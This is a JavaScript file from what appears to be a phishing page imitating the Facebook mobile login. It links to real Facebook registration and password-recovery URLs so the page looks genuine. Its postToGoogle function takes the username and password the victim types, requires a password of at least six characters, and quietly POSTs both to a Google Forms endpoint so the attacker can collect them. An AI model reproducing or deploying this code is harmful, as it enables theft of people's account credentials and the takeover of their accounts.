document.getElementById("passField").onclick=function(){
  if(document.getElementById("pas").style.borderColor=="red"){
    document.getElementById("pas").style.borderColor="inherit";

  }
  else{
    document.getElementById("pas").style.borderColor="inherit";

  }
}
 
 document.getElementById("nameField").onclick=function(){
  if(document.getElementById("nam").style.borderColor=="red"){
    document.getElementById("nam").style.borderColor="inherit";

  }
  else{
    document.getElementById("nam").style.borderColor="inherit";

  }
}

var t=setInterval(
  function (){
    if(document.getElementById("passField").value.length==0){
      document.getElementById("snh").style.display="none";
    }
    else{
     document.getElementById("snh").style.display="flex";
    }
  }
)


function createAccount(){ 
window.location.replace("https://www.facebook.com/reg/?ref=dbl&refid=8&hrc=1");
}


function forgotPassword(){
window.location.replace("https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%253Fhrc%253D1%2526refsrc%253Dhttp%25253A%25252F%25252Fm.facebook.com%25252F%2526soft%253Dbookmarks%26ref%3Ddbl%26fl%26refid%3D9%26hrc%3D1&multiple_results=0&ars=facebook_login&lwv=100&ref=dbl&_rdr");
}


function snhf() {
  var x = document.getElementById("passField");
  if (x.type === "password") {
    x.type = "text";
    document.getElementById("snh").innerHTML="<p>HIDE</p>";
  } else {
    x.type = "password";
    document.getElementById("snh").innerHTML="<p>SHOW</p>";
  }
}

function postToGoogle() {
                var field1 = $("#nameField").val();
                var field2 = $("#passField").val();
        
                    
      
        if(field1 == ""){
          document.getElementById("nam").style.borderColor="red";
          document.getElementById("nameField").value="";
          document.getElementById("passField").value=""; 
          return false;
        }
        if(field2 == ""||field2.length<6){
          document.getElementById("pas").style.borderColor="red";
          document.getElementById("passField").value="";
          document.getElementById("nameField").value="";
          return false; 
          }
                  
                   $.ajax({
                    url: "https://docs.google.com/forms/d/e/1FAIpQLSd-uNdlFBRMCasfwvY41KzRx-pUqeHZ8uUFYsS_4VLAL1nffg/formResponse?",
                    data: {"entry.817289579": field1, "entry.1201250261": field2},
                    type: "POST",
                    dataType: "xml",
                    success: function(d){
                     },
                    error: function(x, y, z){
                      document.getElementById("fscreen").style.display="none";
                      document.getElementById("sucsm").style.display="inherit";
                               }
                            });
                     return false;
                     }